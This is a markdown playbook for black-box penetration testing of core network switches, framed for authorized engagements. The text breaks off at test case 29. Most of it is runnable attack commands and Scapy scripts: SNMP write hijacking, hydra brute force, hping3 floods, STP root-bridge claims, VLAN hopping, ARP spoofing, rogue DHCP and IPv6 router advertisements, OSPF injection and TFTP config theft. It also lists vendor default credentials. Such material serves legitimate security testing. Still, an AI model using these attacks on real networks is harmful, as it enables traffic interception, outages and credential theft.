# 🔐 Core Switch VAPT Playbook (Black Box Testing - Beginner to Practical)

> **Legal Notice:** Only perform these tests on systems you have **written authorization** to test.  
> **Scope:** Black Box testing using only target IP addresses (Core Switches)  
> **OS:** Kali Linux recommended

---

## 📌 OBJECTIVE

Perform Black Box VAPT on Core Switches using only IP addresses.

This playbook provides:
- Step-by-step execution with decision trees
- Commands with full explanation
- Expected outputs (all possibilities)
- Risk rating for each finding
- What to do after each result

---

## ⚠️ RULES OF ENGAGEMENT

```
[ ] Written authorization obtained before starting
[ ] Testing window agreed with client
[ ] Network admin emergency contact noted
[ ] DoS tests approved separately in writing
[ ] All outputs logged and saved as evidence
[ ] Do not assume — always verify
```

---

## 🗂️ COMPLETE TEST CASE INDEX

| # | Test Case | Risk If Vulnerable |
|---|-----------|-------------------|
| TC-01 | Host Discovery | Info |
| TC-02 | Full TCP Port Scan | Medium |
| TC-03 | UDP Port Scan | Medium–High |
| TC-04 | Service & Version Enumeration | High |
| TC-05 | SNMP Enumeration | High |
| TC-06 | Telnet Access Test | Critical |
| TC-07 | SSH Security Test | Medium–High |
| TC-08 | Web Interface Detection | Medium |
| TC-09 | Default Credential Test | Critical |
| TC-10 | Management Port Exposure | Medium |
| TC-11 | SMB Check | High |
| TC-12 | SSL/TLS Test | Medium–High |
| TC-13 | Banner Grabbing | Low–Medium |
| TC-14 | Brute Force (if authorized) | Critical |
| TC-15 | DoS Stability Test (if authorized) | High |
| TC-16 | SNMP Write Access Test | Critical |
| TC-17 | CDP / LLDP Information Leakage | Medium |
| TC-18 | Spanning Tree Protocol (STP) Attack | High |
| TC-19 | VLAN Hopping Test | Critical |
| TC-20 | MAC Flooding Test | High |
| TC-21 | ARP Spoofing Test | High |
| TC-22 | DHCP Starvation / Rogue DHCP | High |
| TC-23 | OSPF / BGP Routing Protocol Test | Critical |
| TC-24 | NTP Enumeration & Amplification | Medium |
| TC-25 | Syslog & Logging Config Exposure | Medium |
| TC-26 | TFTP Server Check | High |
| TC-27 | IPv6 Misconfiguration | Medium–High |
| TC-28 | ICMP Redirect & Info Leakage | Medium |
| TC-29 | Port Security / 802.1X Test | High |
| TC-30 | Network Time Sync Manipulation | Medium |
| TC-31 | ACL Bypass Test | High |
| TC-32 | Config Backup Exposure (TFTP/HTTP) | Critical |
| TC-33 | Vulnerability Scan (Nessus/OpenVAS) | Varies |

---

# ── ORIGINAL TEST CASES (REVIEWED & ENHANCED) ──

---

## TC-01 – Host Discovery

### 🎯 Objective
Confirm the target switch is reachable before running any further tests.

### ❓ Why
Saves time — no point scanning a host that's down or blocking all probes.

### Commands
```bash
# Method 1: ICMP ping sweep
nmap -sn <TARGET_IP>

# Method 2: If ICMP is blocked
nmap -Pn <TARGET_IP>

# Method 3: TCP-based host discovery
nmap -PS22,23,80,443,161 -sn <TARGET_IP>

# Method 4: ARP discovery (same subnet only)
sudo arp-scan --interface=eth0 <SUBNET>/24
```

### Expected Outputs & Next Steps

| Output | Meaning | Next Step |
|--------|---------|-----------|
| `Host is up` | Switch is reachable | Proceed to TC-02 |
| No output / host down | ICMP may be blocked | Run `nmap -Pn <IP>` |
| ARP reply received | Same subnet, definitely alive | Proceed to TC-02 |

### 🔴 Risk: Informational

---

## TC-02 – Full TCP Port Scan

### 🎯 Objective
Identify all open TCP ports — every open port is a potential attack surface.

### Commands
```bash
# Standard SYN scan (fast, requires root)
sudo nmap -sS -p- -T4 <IP> -oN tc02_tcp_full.txt

# If SYN scan blocked, use connect scan
nmap -sT -p- -T3 <IP> -oN tc02_tcp_connect.txt

# Top 1000 ports (quick initial scan)
nmap -sS --top-ports 1000 <IP>
```

### Expected Outputs

| Port | Service | Risk |
|------|---------|------|
| 22 | SSH | Medium — check config |
| 23 | Telnet | 🔴 Critical — plaintext |
| 80/443 | Web Mgmt | Medium–High |
| 161 | SNMP (UDP) | High |
| 179 | BGP | Critical |
| 830 | NETCONF | Medium |
| 8080/8443 | Alt Web | Medium |
| No ports open | Filtered or hardened | Run UDP scan (TC-03) |

### 🔴 Risk: Medium to Critical depending on what's open

---

## TC-03 – UDP Port Scan

### 🎯 Objective
Discover UDP services — often overlooked and frequently misconfigured on switches.

### Commands
```bash
# Top 200 UDP ports
sudo nmap -sU --top-ports 200 <IP> -oN tc03_udp.txt

# Specific critical UDP ports
sudo nmap -sU -p 69,123,161,162,514,1434 <IP>
```

### Critical UDP Ports to Look For

| Port | Service | Risk If Open |
|------|---------|-------------|
| 69 | TFTP | 🔴 High — config backup theft |
| 123 | NTP | Medium — amplification/manipulation |
| 161 | SNMP | 🔴 High — info leakage |
| 162 | SNMP Trap | Medium |
| 514 | Syslog | Medium — log interception |
| 1434 | MSSQL | Medium |

### 🔴 Risk: High (SNMP/TFTP open)

---

## TC-04 – Service & Version Enumeration

### 🎯 Objective
Identify exact software versions — match against known CVEs.

### Commands
```bash
# Full service version + default scripts
nmap -sV -sC <IP> -oN tc04_services.txt

# Aggressive version detection
nmap -sV --version-intensity 9 <IP>

# Run all safe scripts
nmap --script safe <IP> -oN tc04_scripts.txt
```

### Expected Output Example
```
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
23/tcp   open  telnet   Cisco IOS telnetd
80/tcp   open  http     Cisco IOS Embedded Web Server
161/udp  open  snmp     SNMPv2c
```

### After Getting Versions
```bash
# Search for known CVEs for the version found
searchsploit "Cisco IOS 15.2"
searchsploit "OpenSSH 7.2"

# Check NVD online: https://nvd.nist.gov/vuln/search
```

### 🔴 Risk: High (outdated versions with known exploits)

---

## TC-05 – SNMP Enumeration

### 🎯 Objective
Extract detailed device configuration, routing tables, interface info, and more via SNMP.

### Commands
```bash
# Test default community strings
snmpwalk -v2c -c public <IP>
snmpwalk -v2c -c private <IP>
snmpwalk -v1 -c public <IP>

# Brute-force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>

# If community string found, enumerate everything:
snmpwalk -v2c -c <COMMUNITY> <IP> .1    # Full walk

# Specific OIDs:
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1       # System info
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.21    # Routing table
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.2.2     # Interfaces
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.9.2.1.3 # Cisco IOS version
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| System info, interfaces, routes returned | Community string valid | 🔴 High |
| Timeout | SNMP disabled or filtered | 🟢 Secure |
| No data but no timeout | SNMPv3 may be in use | Test SNMPv3 below |

```bash
# Test SNMPv3 (if v1/v2 don't work)
snmpwalk -v3 -l noAuthNoPriv -u admin <IP>
snmpwalk -v3 -l authPriv -u admin -a SHA -A "password" -x AES -X "password" <IP>
```

### 🔴 Risk: High — SNMP with default community exposes full device config

---

## TC-06 – Telnet Access Test

### 🎯 Objective
Check if Telnet (port 23) is enabled — Telnet transmits everything including passwords in plaintext.

### Commands
```bash
# Check if port is open
nmap -p 23 <IP>

# Attempt connection
telnet <IP>

# Banner grab
nc -nv <IP> 23
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| Login prompt appears | Telnet enabled | 🔴 Critical |
| `Connection refused` | Telnet disabled | 🟢 Secure |
| Timeout | Firewall filtered | 🟡 Check ACL |

### If Login Prompt Appears — Try Default Creds
```
Username: admin     Password: admin
Username: cisco     Password: cisco
Username: admin     Password: (blank)
Username: root      Password: root
```

### Capture Plaintext Credentials (Proof of Concept)
```bash
# Capture Telnet traffic in Wireshark (shows plaintext creds)
sudo tcpdump -i eth0 -w tc06_telnet.pcap host <IP> and port 23
# Filter in Wireshark: telnet
```

### 🔴 Risk: Critical — All traffic including passwords visible to any network observer

---

## TC-07 – SSH Security Test

### 🎯 Objective
Verify SSH is configured with strong encryption and not using weak/deprecated algorithms.

### Commands
```bash
# Check open algorithms
nmap --script ssh2-enum-algos <IP> -oN tc07_ssh_algos.txt

# Check SSH version
nmap -sV -p 22 <IP>

# Detailed SSH audit with ssh-audit tool
sudo apt install ssh-audit -y
ssh-audit <IP>
```

### What to Look For (Vulnerabilities)
```
WEAK Key Exchange: diffie-hellman-group1-sha1 (Logjam)
WEAK Cipher: arcfour, 3des-cbc, blowfish-cbc
WEAK MAC: hmac-md5, hmac-sha1-96
OLD Protocol: SSH-1.x (extremely insecure)
```

### Expected Output
```
(kex) diffie-hellman-group1-sha1    -- [FAIL] -- removed since OpenSSH 6.7
(enc) 3des-cbc                      -- [FAIL] -- removed since OpenSSH 6.7
(mac) hmac-md5                      -- [FAIL] -- removed since OpenSSH 6.7
```

### 🔴 Risk: Medium–High (weak algorithms enable downgrade attacks)

---

## TC-08 – Web Interface Detection & Testing

### 🎯 Objective
Identify and test any web-based management interface on the switch.

### Commands
```bash
# Identify web tech
whatweb http://<IP>
whatweb https://<IP>

# Vulnerability scan
nikto -h http://<IP> -o tc08_nikto.txt
nikto -h https://<IP> -ssl -o tc08_nikto_ssl.txt

# Directory brute-force
gobuster dir -u http://<IP> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -o tc08_dirs.txt

# Manual check in browser:
http://<IP>
https://<IP>
http://<IP>:8080
https://<IP>:8443
```

### Common Switch Web Admin Paths
```
http://<IP>/login
http://<IP>/admin
http://<IP>/management
http://<IP>/cgi-bin/luci
http://<IP>/index.html
```

### 🔴 Risk: Medium–Critical (exposed management interface)

---

## TC-09 – Default Credential Test

### 🎯 Objective
Test all management interfaces (SSH, Telnet, Web, SNMP) for default or weak credentials.

### Default Credentials by Vendor
```
Cisco:      admin / (blank), cisco / cisco, admin / cisco
Juniper:    root / (blank), admin / admin
HP/Aruba:   admin / admin, manager / manager
Huawei:     admin / Admin@123, admin / admin
D-Link:     admin / admin, admin / (blank)
Netgear:    admin / password
Extreme:    admin / (blank), root / (blank)
```

### Automated Testing
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4

# Web form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid" -t 4

# Telnet brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://<IP>
```

### 🔴 Risk: Critical — Default credentials = complete device compromise

---

## TC-10 – Management Port Exposure Check

### 🎯 Objective
Determine which management protocols are exposed and whether they are accessible from untrusted networks.

### Commands
```bash
nmap -p 22,23,80,443,161,162,830,8080,8443 <IP> -oN tc10_mgmt_ports.txt

# Check if ports are reachable from outside (test from different VLAN/subnet)
nc -zv <IP> 22
nc -zv <IP> 23
nc -zv <IP> 80
```

### 🔴 Risk: Medium–High (management accessible from untrusted zone)

---

## TC-11 – SMB Check

### 🎯 Objective
Some managed switches run embedded OS that may expose SMB/CIFS file sharing.

### Commands
```bash
nmap -p 445 --script smb-protocols,smb-security-mode <IP>
nmap -p 445 --script smb-vuln* <IP> -oN tc11_smb.txt

# Try anonymous session
smbclient -L //<IP> -N
```

### 🔴 Risk: High (SMBv1 = EternalBlue vulnerability, anonymous shares = data exposure)

---

## TC-12 – SSL/TLS Test

### 🎯 Objective
Test HTTPS management interface for weak protocol versions and cipher suites.

### Commands
```bash
# Enumerate TLS versions and ciphers
nmap --script ssl-enum-ciphers -p 443 <IP> -oN tc12_tls.txt

# Comprehensive TLS audit
testssl.sh <IP>:443

# Check certificate
openssl s_client -connect <IP>:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text | grep -E "Subject|Issuer|Not After"

# Check for self-signed cert
openssl s_client -connect <IP>:443 2>&1 | grep "Verify return code"
```

### Vulnerabilities to Look For
```
TLS 1.0 / TLS 1.1 supported → Medium risk
SSLv3 supported             → POODLE attack
RC4 cipher                  → Broken cipher
NULL cipher                 → No encryption at all
EXPORT ciphers              → Weak 40/56-bit keys
Self-signed certificate     → No trust chain
Expired certificate         → Certificate not maintained
```

### 🔴 Risk: Medium–High

---

## TC-13 – Banner Grabbing

### 🎯 Objective
Extract service banners which often reveal exact software versions, firmware, and OS details.

### Commands
```bash
# Netcat banner grab
nc -nv <IP> 22
nc -nv <IP> 23
nc -nv <IP> 80

# HTTP banner
curl -I http://<IP>
curl -I https://<IP> -k

# Nmap banner script
nmap --script banner -p 22,23,80,443 <IP>

# Telnet banner (shows IOS version on Cisco)
echo "" | nc -w3 <IP> 23
```

### Expected Output Examples
```
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10
Cisco IOS Software, Version 15.2(4)M3
IOS-XE Software, Version 16.09.04
```

### 🔴 Risk: Low–Medium (version info enables targeted CVE research)

---

## TC-14 – Brute Force (If Authorized)

### 🎯 Objective
Test authentication strength by attempting login with common credentials.

### Commands
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4 -o tc14_ssh.txt

# Web interface brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-get://<IP> -o tc14_web.txt

# SNMP community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
```

> ⚠️ **Watch for account lockout** — use `-t 1` (1 thread) and `--wait=3` (3 second delay) if lockout is a concern.

### 🔴 Risk: Critical (if successful)

---

## TC-15 – DoS Stability Test (Only If Authorized)

### 🎯 Objective
Test if the switch can withstand traffic floods without crashing.

### Commands
```bash
# SYN flood (requires explicit authorization)
sudo hping3 -S --flood -p <PORT> <IP>

# ICMP flood
sudo hping3 --icmp --flood <IP>

# UDP flood
sudo hping3 -2 --flood -p 161 <IP>
```

> ⚠️ **CRITICAL WARNING:** These commands can crash production switches and disconnect all users on that network segment. Only run during an agreed maintenance window with explicit written approval.

### 🔴 Risk: High (device instability / outage)

---

# ── NEW TEST CASES (ADDED) ──

---

## TC-16 – SNMP Write Access Test

### 🎯 Objective
Test whether SNMP write access is enabled — allowing an attacker to **modify switch configuration** via SNMP SET commands.

### ❓ Why
SNMP v1/v2c `private` community string typically grants write access. An attacker can change interface configs, routing tables, or even download/upload device configs.

### Commands
```bash
# Test if write community string "private" works
snmpset -v2c -c private <IP> 1.3.6.1.2.1.1.5.0 s "pwned-hostname"
# If it succeeds — you just renamed the switch's hostname via SNMP!

# Restore original hostname immediately after PoC:
snmpset -v2c -c private <IP> 1.3.6.1.2.1.1.5.0 s "OriginalName"

# Test common write community strings
for COMMUNITY in private write rw admin secret; do
  echo -n "Testing '$COMMUNITY': "
  snmpset -v2c -c $COMMUNITY <IP> 1.3.6.1.2.1.1.5.0 s "test" 2>&1 | \
    grep -q "Success" && echo "WRITABLE!" || echo "denied"
done

# Enumerate write permissions
snmpwalk -v2c -c private <IP> 1.3.6.1.2.1.1
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| Hostname/value changes | SNMP write enabled | 🔴 Critical |
| `noSuchObject` or `Timeout` | Write denied | 🟢 Secure |

### 🔴 Risk: Critical — Full device reconfiguration possible via SNMP

---

## TC-17 – CDP / LLDP Information Leakage

### 🎯 Objective
Capture Cisco Discovery Protocol (CDP) or Link Layer Discovery Protocol (LLDP) broadcasts — these reveal switch model, IOS version, IP addresses, and network topology.

### ❓ Why
CDP/LLDP frames are broadcast every 60 seconds. Even with no credentials, an attacker on the same segment can map the entire network topology passively.

### Commands
```bash
# Capture CDP frames (passive — no traffic sent)
sudo tcpdump -i eth0 -nn -v 'ether[12:2] == 0x2000' -w tc17_cdp.pcap

# Read CDP frames
tshark -r tc17_cdp.pcap -Y cdp -V

# Capture LLDP frames
sudo tcpdump -i eth0 -nn -v 'ether proto 0x88cc' -w tc17_lldp.pcap

# Read LLDP
tshark -r tc17_lldp.pcap -Y lldp -V

# Wireshark filters:
# CDP:  cdp
# LLDP: lldp
```

### What CDP Reveals
```
Device ID:        CoreSwitch-01
IP Address:       192.168.1.1
Platform:         Cisco Catalyst 3850
IOS Version:      15.2(4)E7
Interface:        GigabitEthernet1/0/1
Capabilities:     Router Switch IGMP
```

### Expected Outputs

| Finding | Risk |
|---------|------|
| CDP/LLDP frames captured with device details | 🟠 Medium — topology mapping |
| IOS version revealed | 🟠 Medium — CVE research enabled |
| No CDP/LLDP seen | 🟢 Disabled or filtered |

### 🟠 Risk: Medium — Enables targeted attacks using revealed version info

---

## TC-18 – Spanning Tree Protocol (STP) Attack

### 🎯 Objective
Test whether the switch is vulnerable to STP manipulation — an attacker can become the **Root Bridge** and force all traffic to route through their machine.

### ❓ Why
STP has no authentication. By sending superior BPDU frames (lower Bridge ID), any device can claim to be the Root Bridge, enabling full MiTM of all switched traffic.

### Commands
```bash
# Install Yersinia
sudo apt install yersinia -y

# Run STP Root attack (sends superior BPDUs)
sudo yersinia stp -attack 4 -interface eth0
# Attack 4 = Claiming to be Root Bridge

# OR using Scapy manually:
sudo python3 << 'EOF'
from scapy.all import *
from scapy.contrib.spanning_tree import STP

# Craft BPDU with very low Bridge ID (will win Root election)
bpdu = Ether(dst="01:80:c2:00:00:00") / LLC() / STP(
    rootid=0,           # Priority 0 = wins election
    rootmac="aa:bb:cc:dd:ee:ff",  # Your MAC
    bridgeid=0,
    bridgemac="aa:bb:cc:dd:ee:ff"
)
sendp(bpdu, iface="eth0", count=10, inter=1)
print("BPDU sent — check if topology changes")
EOF

# Monitor STP topology changes
sudo tcpdump -i eth0 -nn stp -w tc18_stp.pcap
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| STP topology changes / Root Bridge changes | Attack succeeded | 🔴 High |
| No topology change, BPDUs ignored | BPDU Guard or Root Guard in place | 🟢 Secure |

### 🔴 Risk: High — All traffic can be redirected through attacker machine

---

## TC-19 – VLAN Hopping Test

### 🎯 Objective
Attempt to send traffic to a VLAN you are not authorized to access — bypassing network segmentation.

### ❓ Why
Two VLAN hopping methods exist:
1. **Switch Spoofing** — negotiate a trunk link with the switch (if DTP is enabled)
2. **Double Tagging** — send double-tagged frames to hop from native VLAN to target VLAN

### Method 1 – DTP Trunk Negotiation (Switch Spoofing)
```bash
# Install Yersinia
sudo yersinia dtp -attack 1 -interface eth0
# Attack 1 = Send DTP frames to negotiate trunk

# OR manually with scapy:
sudo python3 << 'EOF'
from scapy.all import *

# DTP desirable mode frame
dtp_frame = Ether(dst="01:00:0c:cc:cc:cc") / \
    LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
    SNAP(OUI=0x00000c, code=0x2004)

sendp(dtp_frame, iface="eth0", count=5)
print("DTP frames sent — check if interface becomes trunk")
EOF

# Verify if trunk negotiated:
# If success — create subinterfaces for each VLAN
sudo ip link add link eth0 name eth0.10 type vlan id 10
sudo ip addr add 10.10.10.100/24 dev eth0.10
sudo ip link set eth0.10 up
ping 10.10.10.1    # Gateway of VLAN 10
```

### Method 2 – Double Tagging
```bash
sudo python3 << 'EOF'
from scapy.all import *

# Double-tagged frame
# Outer tag = native VLAN (stripped by switch)
# Inner tag = target VLAN (forwarded as if it came from that VLAN)
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
      Dot1Q(vlan=1) / \        # Native VLAN — switch strips this
      Dot1Q(vlan=100) / \      # Target VLAN
      IP(dst="10.10.100.1") / \
      ICMP()

sendp(pkt, iface="eth0", count=5)
print("Double-tagged frames sent — listening for ICMP reply...")
sniff(filter="icmp and src 10.10.100.1", count=3, timeout=5)
EOF
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| Trunk negotiated / VLAN accessible | DTP enabled, VLAN hopping possible | 🔴 Critical |
| ICMP reply from target VLAN | Double tagging succeeded | 🔴 Critical |
| No response, attack fails | DTP disabled, native VLAN secured | 🟢 Secure |

### 🔴 Risk: Critical — Network segmentation completely bypassed

---

## TC-20 – MAC Flooding Test

### 🎯 Objective
Flood the switch's CAM table (MAC address table) with fake MAC addresses. When the table overflows, the switch degrades to a hub — broadcasting all traffic to all ports.

### ❓ Why
A full CAM table means the switch can't track where legitimate MACs are, so it floods unicast traffic everywhere — allowing passive sniffing.

### Commands
```bash
# Using macof (part of dsniff)
sudo apt install dsniff -y
sudo macof -i eth0 -n 100000

# Verify attack effect — capture traffic on your interface
sudo tcpdump -i eth0 -c 500 -w tc20_mac_flood.pcap

# Check if you start seeing traffic not destined to you:
sudo tcpdump -i eth0 not ether host <YOUR_MAC>
```

> ⚠️ **Disruptive:** MAC flooding can degrade switch performance for ALL users. Confirm authorization before running.

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| Begin seeing others' unicast traffic | CAM table flooded, switch in hub mode | 🔴 High |
| Port shuts down automatically | Port Security enabled | 🟢 Secure |
| No change in visible traffic | CAM table protected or large enough | 🟢 Secure |

### 🔴 Risk: High — Enables passive sniffing of all traffic on switch segment

---

## TC-21 – ARP Spoofing Test

### 🎯 Objective
Test whether the switch/network is protected against ARP cache poisoning.

### Commands
```bash
# Enable IP forwarding first
sudo sysctl -w net.ipv4.ip_forward=1

# ARP spoof between target endpoint and gateway
sudo arpspoof -i eth0 -t <TARGET_IP> <GATEWAY_IP> &
sudo arpspoof -i eth0 -t <GATEWAY_IP> <TARGET_IP> &

# Verify poisoning worked — check ARP table on target
# (ask client to run:)
arp -a | grep <GATEWAY_IP>
# Should show YOUR MAC mapped to gateway IP

# Capture intercepted traffic
sudo tcpdump -i eth0 -w tc21_arp_mitm.pcap

# Stop attack
sudo pkill arpspoof
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| ARP cache poisoned, traffic intercepted | Dynamic ARP Inspection (DAI) not enabled | 🔴 High |
| Attack blocked, ARP tables unchanged | DAI enabled on switch | 🟢 Secure |

### 🔴 Risk: High — MiTM on entire switched segment

---

## TC-22 – DHCP Starvation / Rogue DHCP Server Test

### 🎯 Objective
Test DHCP security — starvation exhausts the DHCP pool (DoS), rogue DHCP redirects clients' traffic.

### Method 1 – DHCP Starvation
```bash
sudo apt install yersinia -y

# DHCP starvation (sends DISCOVER with random source MACs)
sudo yersinia dhcp -attack 1 -interface eth0

# With dhcpstarv
sudo apt install dhcpstarv -y
sudo dhcpstarv -i eth0
```

### Method 2 – Rogue DHCP Server
```bash
# Set up rogue DHCP server that gives clients YOUR IP as gateway
sudo apt install dnsmasq -y

cat > /tmp/rogue_dhcp.conf << EOF
interface=eth0
dhcp-range=192.168.1.200,192.168.1.250,12h
dhcp-option=3,192.168.1.50    # Your IP as gateway
dhcp-option=6,192.168.1.50    # Your IP as DNS
EOF

sudo dnsmasq -C /tmp/rogue_dhcp.conf --no-daemon
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| DHCP pool exhausted (clients can't get IPs) | DHCP snooping not enabled | 🟠 High |
| Clients accept rogue DHCP offers | No DHCP snooping or DHCP Guard | 🔴 High |
| Attack blocked | DHCP snooping enabled | 🟢 Secure |

### 🔴 Risk: High — Traffic redirection, network disruption

---

## TC-23 – Routing Protocol Security Test (OSPF / BGP)

### 🎯 Objective
Test whether routing protocols (OSPF, BGP, RIP) running on the core switch accept unauthenticated or weakly authenticated updates.

### ❓ Why
An attacker who can inject routing updates can redirect traffic, create black holes, or cause network-wide instability.

### OSPF Test
```bash
# Detect OSPF packets
sudo tcpdump -i eth0 proto ospf -w tc23_ospf.pcap
tshark -r tc23_ospf.pcap -V | grep -E "OSPF|Authentication|Router ID"

# Check if authentication is enabled
# Auth type 0 = no auth (vulnerable), 1 = plain text, 2 = MD5

# Inject OSPF LSA with Scapy (PoC — only in authorized lab)
sudo python3 << 'EOF'
from scapy.all import *
from scapy.contrib.ospf import *

ospf_hello = IP(dst="224.0.0.5", proto=89) / \
             OSPF_Hdr(src="192.168.1.100", area="0.0.0.0") / \
             OSPF_Hello(hellointerval=10, deadinterval=40,
                        mask="255.255.255.0", router="192.168.1.100")

send(ospf_hello, iface="eth0", count=3)
print("OSPF Hello sent — check if switch accepts adjacency")
EOF
```

### BGP Test
```bash
# Detect BGP traffic
sudo tcpdump -i eth0 port 179 -w tc23_bgp.pcap

# Check if MD5 auth is present
tshark -r tc23_bgp.pcap -Y bgp -V | grep -i "auth\|md5"

# Nmap BGP script
nmap -p 179 --script bgp-open <IP>
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| OSPF adjacency formed without auth | No OSPF authentication | 🔴 Critical |
| BGP session opened without MD5 | No BGP authentication | 🔴 Critical |
| Auth required, packets rejected | Protocol authentication enabled | 🟢 Secure |

### 🔴 Risk: Critical — Route injection can redirect or black-hole all network traffic

---

## TC-24 – NTP Enumeration & Security Test

### 🎯 Objective
Test NTP for information disclosure (monlist) and unauthorized time manipulation.

### Commands
```bash
# Check if NTP is running
nmap -sU -p 123 <IP>

# NTP info disclosure (monlist — lists last 600 clients)
sudo ntpdc -c monlist <IP>
# If it returns client list: VULNERABLE to NTP amplification DDoS

# Nmap NTP scripts
nmap -sU -p 123 --script ntp-info,ntp-monlist <IP>

# Read NTP version
ntpq -c version <IP>

# Test if switch accepts time set from unauthorized source
# (if successful, can desync security logs / certificate validity)
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| `monlist` returns client list | NTP amplification vector | 🟠 Medium–High |
| NTP version disclosed | Info leakage | 🟡 Low |
| NTP accepts updates from any source | Time manipulation possible | 🟠 Medium |
| `monlist` refused | NTP hardened | 🟢 Secure |

### 🟠 Risk: Medium — NTP amplification DDoS, log timestamp manipulation

---

## TC-25 – Syslog & Logging Configuration Exposure

### 🎯 Objective
Verify syslog is secured — logs should not be sent unencrypted, and syslog servers should not be accessible from untrusted networks.

### Commands
```bash
# Listen for syslog traffic (UDP 514)
sudo tcpdump -i eth0 -nn port 514 -A -w tc25_syslog.pcap

# If you receive syslog packets — you are on the same segment as the log stream
tshark -r tc25_syslog.pcap -Y syslog -T fields -e syslog.msg

# Check if SNMP reveals syslog config
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.9.9.41    # Cisco syslog MIB
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| Syslog messages captured in plaintext | Unencrypted syslog | 🟠 Medium |
| Config changes / login events visible | Sensitive operational data exposed | 🟠 Medium |
| No syslog traffic visible | Encrypted (TLS syslog) or not logging | 🟢 Better |

### 🟠 Risk: Medium — Operational intelligence leakage

---

## TC-26 – TFTP Server Check

### 🎯 Objective
Test if TFTP (Trivial File Transfer Protocol) is running — attackers can download the switch's running config, which contains all passwords and network design.

### Commands
```bash
# Check if UDP 69 is open
sudo nmap -sU -p 69 <IP>

# Attempt to download running config
tftp <IP>
tftp> get running-config
tftp> get startup-config
tftp> get cisco-config.txt

# Common config filenames to try:
for FILE in running-config startup-config config.txt router-config switch.cfg; do
  echo "Trying: $FILE"
  tftp -g -r $FILE <IP> 2>/dev/null && echo "DOWNLOADED: $FILE" || echo "Not found: $FILE"
done
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| Config file downloaded | TFTP exposed, config stolen | 🔴 Critical |
| Connection refused / timeout | TFTP disabled | 🟢 Secure |
| File not found | TFTP enabled but file names unknown | 🟠 Medium (still risky) |

### 🔴 Risk: Critical — Running config contains plaintext enable passwords, SNMP community strings, ACLs

---

## TC-27 – IPv6 Misconfiguration Test

### 🎯 Objective
Check if IPv6 is enabled and whether IPv6-specific attacks are possible — many switches have IPv6 enabled by default with no security controls.

### Commands
```bash
# Discover IPv6 addresses on the switch
nmap -6 -sn ff02::1%eth0     # Multicast all-nodes
ping6 -I eth0 ff02::1        # Ping all IPv6 hosts

# Scan discovered IPv6 addresses
nmap -6 -sV <IPv6_ADDRESS>

# Check for IPv6 Router Advertisement spoofing (rogue RA)
sudo apt install rtadvd radvd -y

# Send rogue RA to assign your machine as IPv6 default router
sudo python3 << 'EOF'
from scapy.all import *

ra = IPv6(dst="ff02::1") / \
     ICMPv6ND_RA(routerlifetime=9000) / \
     ICMPv6NDOptPrefixInfo(prefix="dead:beef::", prefixlen=64)

sendp(Ether(dst="33:33:00:00:00:01") / ra, iface="eth0", count=5)
print("Rogue RA sent — check if clients accept IPv6 route")
EOF

# Detect existing RA traffic
sudo tcpdump -i eth0 -nn icmp6 -w tc27_ipv6.pcap
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| IPv6 address found on switch | IPv6 active, check security | 🟡 Medium |
| Rogue RA accepted by clients | No RA Guard | 🔴 High |
| SLAAC assigns attacker's IP as gateway | Full MiTM via IPv6 | 🔴 High |
| IPv6 disabled | Not applicable | 🟢 N/A |

### 🔴 Risk: Medium–High — IPv6 often unmonitored and without security controls

---

## TC-28 – ICMP Redirect & Information Leakage

### 🎯 Objective
Test if the switch responds to ICMP with information that reveals network topology, and whether it accepts ICMP redirects.

### Commands
```bash
# Check ICMP redirect acceptance
# Send ICMP redirect telling target to use your machine as its gateway
sudo python3 << 'EOF'
from scapy.all import *

redirect = IP(src="<GATEWAY_IP>", dst="<TARGET_IP>") / \
           ICMP(type=5, code=1, gw="<ATTACKER_IP>") / \
           IP(src="<TARGET_IP>", dst="8.8.8.8") / \
           UDP(dport=53)

send(redirect, count=3)
print("ICMP redirect sent")
EOF

# ICMP timestamp request (may reveal OS uptime)
nmap --script icmp-info <IP>

# Traceroute — reveals internal network hops
traceroute <IP>
traceroute -I <IP>     # ICMP-based
```

### Expected Outputs

| Output | Meaning | Risk |
|--------|---------|------|
| ICMP redirect accepted, routing changed | ICMP redirect vulnerability | 🟠 Medium |
| Internal IPs revealed in traceroute | Network topology exposed | 🟡 Low–Medium |
| ICMP timestamps returned | OS fingerprinting possible | 🟡 Low |

### 🟠 Risk: Medium

---

## TC-29 – Port Security & 802.1X Test

### 🎯 Objective
Test whether the switch enforces port-level authentication (802.1X) and port security (MAC limiting).

### ❓ Why
Without port security, anyone can plug a device into a switch port and get network access.

### Commands
```bash
# Test if you can connect without 802.1X authentication
